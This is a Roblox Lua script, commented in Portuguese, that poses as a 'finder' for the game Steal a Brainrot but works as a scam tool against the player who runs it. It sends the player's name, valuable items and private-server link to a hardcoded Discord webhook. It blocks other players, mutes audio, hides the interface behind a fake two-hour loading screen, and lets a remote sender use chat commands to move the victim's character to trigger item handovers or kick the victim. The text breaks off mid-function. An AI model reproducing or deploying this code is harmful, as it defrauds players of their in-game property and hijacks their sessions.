-- ========================================
-- METODH_BRANZZ FINDER BASE V2.1 (FIXED)
-- UI de Carregamento Corrigida
-- ========================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")

-- ========================================
-- CONFIGURAÇÕES GLOBAIS
-- ========================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1471173278344282196/7h0FRmmJx1175PZixg2A-3iWbsXSJ1Ez9iUkynxJy4Qf44NUt0PLSzkJLqlOENufZvpS"

-- IDs dos Brainrots (da imagem fornecida)
local TARGET_IDS = {
    "272f95ca-4010-4d86-96ea-ad2030539db7",
    "795258e2-ddc9-46cf-9004-3f2a70a29b06",
    "8bf3a18f-f052-49c2-a564-b454f811ad18",
    "b94b6e1f-75be-455b-813c-7443ceee52f6",
    "bb1a0085-0d3a-450c-bb6b-937503c5687c",
    "bc4f88c8-9e55-49b9-876d-5445b87fa999",
    "bf94887a-2285-485f-a883-36483b096ce1",
    "f23f0ece-cb81-4e6a-8a0e-24c0aa94f0bd"
}

-- Lista de Brainrots válidos
local VALID_BRAINROTS = {
    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Iì Iì Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobì Tobì", 
    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
    "Brr Brr Patapùn", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
}

-- ========================================
-- FUNÇÕES DE DETECÇÃO DE BRAINROTS
-- ========================================

local function isValidBrainrot(name)
    for _, brainrot in ipairs(VALID_BRAINROTS) do
        if name == brainrot then
            return true
        end
    end
    return false
end

local function parseMoneyPerSec(text)
    if not text then return 0 end
    local mult = 1
    local numberStr = text:match("[%d%.]+")
    if not numberStr then return 0 end
    if text:find("K") then mult = 1000
    elseif text:find("M") then mult = 1000000
    elseif text:find("B") then mult = 1000000000
    elseif text:find("T") then mult = 1000000000000
    elseif text:find("Q") then mult = 1000000000000000 end
    return tonumber(numberStr) * mult
end

local function findBrainrots()
    local foundBrainrots = {}
    
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetDescendants()) do
            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
                local generation = ""
                for _, child in pairs(plot:GetDescendants()) do
                    if child:IsA("TextLabel") and child.Name == "Generation" then
                        generation = child.ContentText or child.Text
                        break
                    end
                end
                
                local income = parseMoneyPerSec(generation)
                table.insert(foundBrainrots, {
                    name = plot.Name,
                    income = income,
                    incomeText = generation
                })
            end
        end
    end
    
    for _, id in ipairs(TARGET_IDS) do
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:GetAttribute("UUID") == id or obj:GetAttribute("ID") == id then
                if obj:IsA("Model") and isValidBrainrot(obj.Name) then
                    local generation = ""
                    for _, child in pairs(obj:GetDescendants()) do
                        if child:IsA("TextLabel") and child.Name == "Generation" then
                            generation = child.ContentText or child.Text
                            break
                        end
                    end
                    
                    local income = parseMoneyPerSec(generation)
                    table.insert(foundBrainrots, {
                        name = obj.Name,
                        income = income,
                        incomeText = generation
                    })
                end
            end
        end
    end
    
    local uniqueBrainrots = {}
    local seen = {}
    for _, brainrot in ipairs(foundBrainrots) do
        if not seen[brainrot.name] then
            table.insert(uniqueBrainrots, brainrot)
            seen[brainrot.name] = true
        end
    end
    
    table.sort(uniqueBrainrots, function(a, b)
        return a.income > b.income
    end)
    
    return uniqueBrainrots
end

-- ========================================
-- FUNÇÕES DE WEBHOOK
-- ========================================

local function sendWebhook(embedData)
    local success, err = pcall(function()
        local jsonData = HttpService:JSONEncode(embedData)
        
        HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
    
    if success then
        print("✅ Webhook enviado com sucesso!")
    else
        warn("❌ Erro ao enviar webhook:", err)
    end
end

-- ========================================
-- FUNÇÕES DE BLOQUEIO DE PLAYERS
-- ========================================

local function blockPlayer(player)
    pcall(function()
        LocalPlayer:RequestFriendship(player)
        task.wait(0.1)
        LocalPlayer:BlockUser(player.UserId)
    end)
end

local function blockOtherPlayers()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            blockPlayer(player)
            print("🚫 Bloqueado:", player.Name)
        end
    end
end

-- ========================================
-- SISTEMA DE COMANDOS NO CHAT
-- ========================================

local function setupChatCommands()
    local function onChatMessage(message, sender)
        local lowerMsg = string.lower(message)
        
        if lowerMsg == "kick" or lowerMsg == "/kick" then
            LocalPlayer:Kick("0981: Failed to Loading server modules")
        end
        
        if lowerMsg == "abrir" or lowerMsg == "/abrir" then
            spawn(function()
                pcall(function()
                    LocalPlayer:RequestFriendship(sender)
                end)
                
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Health = 0
                    
                    LocalPlayer.CharacterAdded:Wait()
                    task.wait(1)
                    
                    local char = LocalPlayer.Character
                    if char and char:FindFirstChild("HumanoidRootPart") then
                        local hrp = char.HumanoidRootPart
                        local humanoid = char:FindFirstChild("Humanoid")
                        
                        local targetPos = hrp.Position + (hrp.CFrame.LookVector * 78)
                        humanoid:MoveTo(targetPos)
                        
                        task.wait(4)
                        
                        targetPos = hrp.Position - (hrp.CFrame.LookVector * 2)
                        humanoid:MoveTo(targetPos)
                        
                        task.wait(0.5)
                        
                        for _, descendant in pairs(Workspace:GetDescendants()) do
                            if descendant:IsA("ProximityPrompt") then
                                local distance = (descendant.Parent.Position - hrp.Position).Magnitude
                                if distance <= 10 then
                                    fireproximityprompt(descendant)
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
    
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.MessageReceived:Connect(function(message)
            local text = message.Text
            local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
            if sender then
                onChatMessage(text, sender)
            end
        end)
    else
        local DefaultChatSystemChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if DefaultChatSystemChatEvents then
            local OnMessageDoneFiltering = DefaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering")
            if OnMessageDoneFiltering then
                OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
                    if messageData and messageData.Message then
                        local sender = Players:FindFirstChild(messageData.FromSpeaker)
                        if sender then
                            onChatMessage(messageData.Message, sender)
                        end
                    end
                end)
            end
        end
    end
end

-- ========================================
-- CRIAÇÃO DA GUI PRINCIPAL
-- ========================================

local function createMainGUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "MetodhBranzz"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    pcall(function()
        ScreenGui.Parent = CoreGui
    end)
    
    if not ScreenGui.Parent then
        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 500, 0, 300)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
    MainFrame.BackgroundColor3 = Color3.fromRGB(35, 15, 55)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    local Shadow = Instance.new("ImageLabel")
    Shadow.Name = "Shadow"
    Shadow.Size = UDim2.new(1, 40, 1, 40)
    Shadow.Position = UDim2.new(0, -20, 0, -20)
    Shadow.BackgroundTransparency = 1
    Shadow.Image = "rbxassetid://6015897843"
    Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    Shadow.ImageTransparency = 0.6
    Shadow.ScaleType = Enum.ScaleType.Slice
    Shadow.SliceCenter = Rect.new(49, 49, 450, 450)
    Shadow.ZIndex = 0
    Shadow.Parent = MainFrame
    
    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(90, 45, 140)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(60, 30, 95)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 15, 55))
    }
    Gradient.Rotation = 135
    Gradient.Parent = MainFrame
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 18)
    Corner.Parent = MainFrame
    
    local BorderStroke = Instance.new("UIStroke")
    BorderStroke.Color = Color3.fromRGB(140, 80, 200)
    BorderStroke.Thickness = 3
    BorderStroke.Transparency = 0.3
    BorderStroke.Parent = MainFrame
    
    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, -40, 0, 70)
    Title.Position = UDim2.new(0, 20, 0, 20)
    Title.BackgroundTransparency = 1
    Title.Text = "METODH_BRANZZ FINDER BASE"
    Title.TextColor3 = Color3.fromRGB(220, 180, 255)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 24
    Title.TextXAlignment = Enum.TextXAlignment.Center
    Title.Parent = MainFrame
    
    local TitleStroke = Instance.new("UIStroke")
    TitleStroke.Color = Color3.fromRGB(160, 100, 220)
    TitleStroke.Thickness = 2
    TitleStroke.Transparency = 0.4
    TitleStroke.Parent = Title
    
    local InstructionLabel = Instance.new("TextLabel")
    InstructionLabel.Name = "InstructionLabel"
    InstructionLabel.Size = UDim2.new(1, -40, 0, 30)
    InstructionLabel.Position = UDim2.new(0, 20, 0, 95)
    InstructionLabel.BackgroundTransparency = 1
    InstructionLabel.Text = "🔗 Insira o link do servidor privado do Roblox:"
    InstructionLabel.TextColor3 = Color3.fromRGB(230, 210, 255)
    InstructionLabel.Font = Enum.Font.GothamMedium
    InstructionLabel.TextSize = 15
    InstructionLabel.TextXAlignment = Enum.TextXAlignment.Left
    InstructionLabel.Parent = MainFrame
    
    local TextBox = Instance.new("TextBox")
    TextBox.Name = "LinkInput"
    TextBox.Size = UDim2.new(1, -40, 0, 50)
    TextBox.Position = UDim2.new(0, 20, 0, 130)
    TextBox.BackgroundColor3 = Color3.fromRGB(50, 25, 75)
    TextBox.BorderSizePixel = 0
    TextBox.Text = ""
    TextBox.PlaceholderText = "https://www.roblox.com/share?code=..."
    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.PlaceholderColor3 = Color3.fromRGB(160, 140, 180)
    TextBox.Font = Enum.Font.Gotham
    TextBox.TextSize = 13
    TextBox.ClearTextOnFocus = false
    TextBox.Parent = MainFrame
    
    local TextBoxCorner = Instance.new("UICorner")
    TextBoxCorner.CornerRadius = UDim.new(0, 10)
    TextBoxCorner.Parent = TextBox
    
    local TextBoxStroke = Instance.new("UIStroke")
    TextBoxStroke.Color = Color3.fromRGB(120, 80, 160)
    TextBoxStroke.Thickness = 2
    TextBoxStroke.Transparency = 0.5
    TextBoxStroke.Parent = TextBox
    
    local StartButton = Instance.new("TextButton")
    StartButton.Name = "StartButton"
    StartButton.Size = UDim2.new(1, -40, 0, 55)
    StartButton.Position = UDim2.new(0, 20, 0, 195)
    StartButton.BackgroundColor3 = Color3.fromRGB(130, 70, 190)
    StartButton.BorderSizePixel = 0
    StartButton.Text = "🚀 START METODH"
    StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    StartButton.Font = Enum.Font.GothamBold
    StartButton.TextSize = 20
    StartButton.AutoButtonColor = false
    StartButton.Parent = MainFrame
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 12)
    ButtonCorner.Parent = StartButton
    
    local ButtonGradient = Instance.new("UIGradient")
    ButtonGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 90, 230)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 60, 160))
    }
    ButtonGradient.Rotation = 90
    ButtonGradient.Parent = StartButton
    
    local ButtonStroke = Instance.new("UIStroke")
    ButtonStroke.Color = Color3.fromRGB(190, 140, 255)
    ButtonStroke.Thickness = 3
    ButtonStroke.Transparency = 0.3
    ButtonStroke.Parent = StartButton
    
    StartButton.MouseEnter:Connect(function()
        TweenService:Create(StartButton, TweenInfo.new(0.3), {
            BackgroundColor3 = Color3.fromRGB(150, 90, 210)
        }):Play()
        TweenService:Create(ButtonStroke, TweenInfo.new(0.3), {
            Thickness = 4
        }):Play()
    end)
    
    StartButton.MouseLeave:Connect(function()
        TweenService:Create(StartButton, TweenInfo.new(0.3), {
            BackgroundColor3 = Color3.fromRGB(130, 70, 190)
        }):Play()
        TweenService:Create(ButtonStroke, TweenInfo.new(0.3), {
            Thickness = 3
        }):Play()
    end)
    
    MainFrame.Size = UDim2.new(0, 0, 0, 0)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    
    TweenService:Create(MainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 500, 0, 300),
        Position = UDim2.new(0.5, -250, 0.5, -150)
    }):Play()
    
    return ScreenGui, MainFrame, TextBox, StartButton
end

-- ========================================
-- CRIAÇÃO DA TELA DE CARREGAMENTO (CORRIGIDA)
-- ========================================

local function createLoadingScreen()
    -- Esconde TODOS os CoreGuis do Roblox
    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)
    
    local LoadingGui = Instance.new("ScreenGui")
    LoadingGui.Name = "LoadingScreen"
    LoadingGui.ResetOnSpawn = false
    LoadingGui.IgnoreGuiInset = true -- IMPORTANTE: Ignora insets para cobrir TUDO
    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    LoadingGui.DisplayOrder = 2147483647 -- MÁXIMO possível
    
    pcall(function()
        LoadingGui.Parent = CoreGui
    end)
    
    if not LoadingGui.Parent then
        LoadingGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end
    
    -- Fundo ABSOLUTO cobrindo TODA a tela
    local Background = Instance.new("Frame")
    Background.Name = "Background"
    Background.Size = UDim2.new(1, 0, 1, 100) -- +100 pixels para garantir
    Background.Position = UDim2.new(0, 0, 0, -50)
    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Background.BorderSizePixel = 0
    Background.ZIndex = 2147483647
    Background.Parent = LoadingGui
    
    local BgGradient = Instance.new("UIGradient")
    BgGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 5, 25)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 5, 15)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 0, 10))
    }
    BgGradient.Rotation = 45
    BgGradient.Parent = Background
    
    -- Container central
    local Container = Instance.new("Frame")
    Container.Name = "Container"
    Container.Size = UDim2.new(0, 700, 0, 300)
    Container.Position = UDim2.new(0.5, -350, 0.5, -150)
    Container.BackgroundTransparency = 1
    Container.ZIndex = 2147483647
    Container.Parent = Background
    
    -- Título de carregamento
    local LoadingTitle = Instance.new("TextLabel")
    LoadingTitle.Name = "LoadingTitle"
    LoadingTitle.Size = UDim2.new(1, 0, 0, 70)
    LoadingTitle.Position = UDim2.new(0, 0, 0, 0)
    LoadingTitle.BackgroundTransparency = 1
    LoadingTitle.Text = "⚡ INICIANDO SISTEMA..."
    LoadingTitle.TextColor3 = Color3.fromRGB(200, 140, 255)
    LoadingTitle.Font = Enum.Font.GothamBold
    LoadingTitle.TextSize = 32
    LoadingTitle.ZIndex = 2147483647
    LoadingTitle.Parent = Container
    
    local TitleGlow = Instance.new("UIStroke")
    TitleGlow.Color = Color3.fromRGB(150, 90, 220)
    TitleGlow.Thickness = 3
    TitleGlow.Transparency = 0.2
    TitleGlow.Parent = LoadingTitle
    
    -- Status text (mensagens rotativas)
    local StatusText = Instance.new("TextLabel")
    StatusText.Name = "StatusText"
    StatusText.Size = UDim2.new(1, 0, 0, 35)
    StatusText.Position = UDim2.new(0, 0, 0, 75)
    StatusText.BackgroundTransparency = 1
    StatusText.Text = "🚀 Iniciando módulos"
    StatusText.TextColor3 = Color3.fromRGB(180, 140, 220)
    StatusText.Font = Enum.Font.Gotham
    StatusText.TextSize = 18
    StatusText.ZIndex = 2147483647
    StatusText.Parent = Container
    
    -- Barra de progresso (fundo)
    local ProgressBarBg = Instance.new("Frame")
    ProgressBarBg.Name = "ProgressBarBg"
    ProgressBarBg.Size = UDim2.new(1, 0, 0, 45)
    ProgressBarBg.Position = UDim2.new(0, 0, 0, 130)
    ProgressBarBg.BackgroundColor3 = Color3.fromRGB(25, 10, 40)
    ProgressBarBg.BorderSizePixel = 0
    ProgressBarBg.ZIndex = 2147483647
    ProgressBarBg.Parent = Container
    
    local BarBgCorner = Instance.new("UICorner")
    BarBgCorner.CornerRadius = UDim.new(0, 15)
    BarBgCorner.Parent = ProgressBarBg
    
    local BarBgStroke = Instance.new("UIStroke")
    BarBgStroke.Color = Color3.fromRGB(80, 40, 120)
    BarBgStroke.Thickness = 3
    BarBgStroke.Parent = ProgressBarBg
    
    -- Barra de progresso (preenchimento)
    local ProgressBar = Instance.new("Frame")
    ProgressBar.Name = "ProgressBar"
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    ProgressBar.Position = UDim2.new(0, 0, 0, 0)
    ProgressBar.BackgroundColor3 = Color3.fromRGB(150, 90, 230)
    ProgressBar.BorderSizePixel = 0
    ProgressBar.ZIndex = 2147483647
    ProgressBar.Parent = ProgressBarBg
    
    local BarCorner = Instance.new("UICorner")
    BarCorner.CornerRadius = UDim.new(0, 15)
    BarCorner.Parent = ProgressBar
    
    local BarGradient = Instance.new("UIGradient")
    BarGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 120, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(160, 90, 230)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 70, 200))
    }
    BarGradient.Rotation = 0
    BarGradient.Parent = ProgressBar
    
    -- Texto de porcentagem
    local PercentageText = Instance.new("TextLabel")
    PercentageText.Name = "PercentageText"
    PercentageText.Size = UDim2.new(1, 0, 0, 60)
    PercentageText.Position = UDim2.new(0, 0, 0, 195)
    PercentageText.BackgroundTransparency = 1
    PercentageText.Text = "0%"
    PercentageText.TextColor3 = Color3.fromRGB(220, 180, 255)
    PercentageText.Font = Enum.Font.GothamBold
    PercentageText.TextSize = 38
    PercentageText.ZIndex = 2147483647
    PercentageText.Parent = Container
    
    return LoadingGui, ProgressBar, PercentageText, LoadingTitle, StatusText
end

-- ========================================
-- ANIMAÇÃO DE PROGRESSO (CORRIGIDA)
-- ========================================

local function animateProgress(progressBar, percentageText, titleLabel, statusText)
    local statusMessages = {
        "👥 Procurando Players",
        "🚀 Iniciando módulos",
        "💰 Procurando brainrots de mais valor",
        "🔍 Escaneando workspace",
        "🌐 Estabelecendo conexão",
        "⚙️ Configurando sistema",
        "🔐 Verificando segurança",
        "📡 Sincronizando dados",
        "💎 Analisando valores",
        "🎯 Finalizando processo"
    }
    
    spawn(function()
        local currentPercent = 0
        local targetPercent = 99
        local updateInterval = 0.1 -- Atualiza a cada 0.1 segundos
        local totalTime = 7200 -- 2 horas em segundos
        local totalUpdates = totalTime / updateInterval
        local percentPerUpdate = targetPercent / totalUpdates
        
        local lastStatusChange = tick()
        local statusIndex = 1
        
        while currentPercent < targetPercent do
            task.wait(updateInterval)
            
            -- Incrementa a porcentagem
            currentPercent = currentPercent + percentPerUpdate
            
            -- Garante que não passa de 99
            if currentPercent >= targetPercent then
                currentPercent = targetPercent
            end
            
            local displayPercent = math.floor(currentPercent)
            
            -- Atualiza barra de progresso
            local targetSize = UDim2.new(currentPercent / 100, 0, 1, 0)
            progressBar.Size = targetSize
            
            -- Atualiza texto da porcentagem
            percentageText.Text = string.format("%d%%", displayPercent)
            
            -- Muda mensagens de status a cada 4 segundos
            if tick() - lastStatusChange >= 4 then
                statusIndex = (statusIndex % #statusMessages) + 1
                statusText.Text = statusMessages[statusIndex]
                lastStatusChange = tick()
            end
            
            -- Muda título em diferentes estágios
            if displayPercent >= 1 and displayPercent < 10 then
                titleLabel.Text = "🔍 ESCANEANDO SISTEMA..."
            elseif displayPercent >= 10 and displayPercent < 25 then
                titleLabel.Text = "🧠 DETECTANDO BRAINROTS..."
            elseif displayPercent >= 25 and displayPercent < 40 then
                titleLabel.Text = "💰 CALCULANDO VALORES..."
            elseif displayPercent >= 40 and displayPercent < 55 then
                titleLabel.Text = "🌐 ESTABELECENDO CONEXÃO..."
            elseif displayPercent >= 55 and displayPercent < 70 then
                titleLabel.Text = "📡 SINCRONIZANDO DADOS..."
            elseif displayPercent >= 70 and displayPercent < 85 then
                titleLabel.Text = "⚡ PROCESSANDO INFORMAÇÕES..."
            elseif displayPercent >= 85 and displayPercent < 99 then
                titleLabel.Text = "🎯 FINALIZANDO..."
            end
        end
        
        -- Fica travado em 99%
        percentageText.Text = "99%"
        titleLabel.Text = "⏳ AGUARDE... QUASE LÁ..."
        statusText.Text = "🔄 Sincronização final em andamento..."
        
        print("✅ Progresso travado em 99%")
    end)
end

-- ========================================
-- SISTEMA DE SILÊNCIO DE ÁUDIO
-- ========================================

local function muteAllAudio()
    spawn(function()
        UserGameSettings.MasterVolume = 0
        SoundService.Volume = 0
        
        print("🔇 Volume definido para 0%")
        
        while true do
            task.wait(0.5)
            UserGameSettings.MasterVolume = 0
            SoundService.Volume = 0
        end
    end)
end

-- ========================================
-- ENVIO DE WEBHOOK INICIAL
-- ========================================

local function sendInitialWebhook()
    local brainrots = findBrainrots()
    local playerCount = #Players:GetPlayers()
    
    local brainrotList = ""
    if #brainrots > 0 then
        for i, brainrot in pairs(brainrots) do
            if i <= 20 then
                local incomeDisplay = brainrot.incomeText ~= "" and brainrot.incomeText or "N/A"
                brainrotList = brainrotList .. string.format("⭐ %s  💰💲: %s\n", brainrot.name, incomeDisplay)
            end
        end
    else
        brainrotList = "❌ Nenhum brainrot detectado"
    end
    
    local embedData = {
        content = "@everyone @here New Player In Link Screen || @everyone @here ||",
        embeds = {
            {
                title = "🎮 NOVO EXECUTOR NA TELA DE LINK",
                description = "Um novo player executou o script e está na tela de inserção de link!",
                color = 8388736,
                fields = {
                    {
                        name = "👤 Player Executor",
                        value = string.format("**%s** (@%s)", LocalPlayer.DisplayName, LocalPlayer.Name),
                        inline = false
                    },
                    {
                        name = "👥 Players In Server",
                        value = string.format("**%d** player(s) no servidor", playerCount),
                        inline = true
                    },
                    {
                        name = "🧠 BRAINROTS DETECTED",
                        value = brainrotList,
                        inline = false
                    }
                },
                footer = {
                    text = "METODH_BRANZZ FINDER BASE • By Project BRANZz"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
    
    sendWebhook(embedData)
end

-- ========================================
-- ENVIO DE WEBHOOK COM LINK DO SERVIDOR
-- ========================================

local function sendServerLinkWebhook(serverLink)
    local brainrots = findBrainrots()
    local playerCount = #Players:GetPlayers()
    
    local brainrotList = ""
    if #brainrots > 0 then
        for i, brainrot in pairs(brainrots) do
            if i <= 20 then
                local incomeDisplay = brainrot.incomeText ~= "" and brainrot.incomeText or "N/A"
                brainrotList = brainrotList .. string.format("⭐ %s || 💰💲: %s\n", brainrot.name, incomeDisplay)
            end
        end
    else
        brainrotList = "❌ Nenhum brainrot detectado"
    end
    
    local embedData = {
        content = "@everyone @here New SERVER DETECTED || @everyone @here ||",
        embeds = {
            {
                title = "🔗 NOVO SERVIDOR CONFIRMADO",
                description = "Link do servidor privado detectado e confirmado!",
                color = 8388736,
                fields = {
                    {
                        name = "👤 Player Executor",
                        value = string.format("**%s** (@%s)", LocalPlayer.DisplayName, LocalPlayer.Name),
                        inline = false
                    },
                    {
                        name = "👥 Players In Server",
                        value = string.format("**%d** player(s) no servidor", playerCount),
                        inline = true
                    },
                    {
                        name = "🔗 LINK DO SERVIDOR",
                        value = string.format("[Clique aqui](%s)", serverLink),
                        inline = false
                    },
                    {
                        name = "🧠 BRAINROTS DETECTED",
                        value = brainrotList,
                        inline = false
                    }
                },
                footer = {
                    text = "METODH_BRANZZ FINDER BASE • By Project BRANZz"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
    
    sendWebhook(embedData)
end

-- ========================================
-- VALIDAÇÃO DE LINK
-- ========================================

local function isValidRobloxLink(link)
    return string.match(link, "https://www%.roblox%.com/share%?code=") ~= nil and
           string.match(link, "&type=Server") ~= nil
end

-- ========================================
-- FUNÇÃO PRINCIPAL
-- ========================================

local function main()
